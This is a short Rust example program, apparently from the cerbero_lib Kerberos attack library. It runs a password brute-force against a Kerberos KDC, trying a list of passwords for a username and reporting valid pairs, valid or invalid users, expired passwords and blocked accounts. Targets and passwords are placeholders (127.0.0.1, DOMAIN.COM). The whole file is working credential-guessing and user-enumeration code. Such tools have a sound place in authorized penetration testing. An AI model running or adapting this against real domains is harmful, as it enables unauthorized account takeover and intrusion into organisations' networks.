use cerbero_lib::{brute, BruteResult, KdcComm, Kdcs, TransportProtocol};
use std::net::{IpAddr, Ipv4Addr};

fn main()
{
	let mut kdcs = Kdcs::new();
	let kdc_ip = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
	kdcs.insert("DOMAIN.COM".to_string(), kdc_ip);

	let mut kdccomm = KdcComm::new(kdcs, TransportProtocol::TCP);

	let passwords = ["password1", "password2"];

	match kdccomm.create_channel("DOMAIN.COM")
	{
		Ok(channel) =>
		{
			for password in passwords.iter()
			{
				match brute("DOMAIN.COM", "Username", password, channel.as_ref())
				{
					Ok(result) => match result
					{
						BruteResult::ValidPair(username, password) =>
						{
							println!("Valid User \"{}\" with Password \"{}\"", username, password)
						},
						BruteResult::InvalidUser(username) =>
						{
							println!("Invalid User \"{}\"", username)
						},
						BruteResult::ValidUser(username) =>
						{
							println!("Valid User \"{}\"", username)
						},
						BruteResult::ExpiredPassword(username, password) =>
						{
							println!("Valid User \"{}\" with Expired Password \"{}\"", username, password)
						},
						BruteResult::BlockedUser(username) =>
						{
							println!("Blocked User \"{}\"", username)
						},
					},
					Err(e) => panic!("Failed to brute force the KDC: {}", e),
				}
			}
		},
		Err(e) => panic!("Failed to create a channel to the KDC: {}", e),
	}
}
